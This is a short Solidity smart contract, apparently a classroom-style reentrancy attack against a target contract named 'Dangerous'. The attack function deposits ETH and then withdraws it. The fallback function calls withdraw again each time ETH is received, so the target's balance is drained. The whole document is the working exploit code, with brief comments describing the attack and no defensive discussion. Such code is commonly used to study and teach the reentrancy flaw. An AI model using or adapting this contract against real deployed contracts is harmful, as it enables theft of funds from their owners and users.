contract Attack {
    Dangerous public target;

    constructor(address _target) public {
        target = Dangerous(_target);
    }

    // Launch an attack: Deposit first and then withdraw
    function attack() public payable {
        target.depositMoney.value(msg.value)();
        target.withdraw(msg.value);
    }

    // fallback function: Triggered when ETH is received, it is used for recursively calling withdraw()
    function () external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}
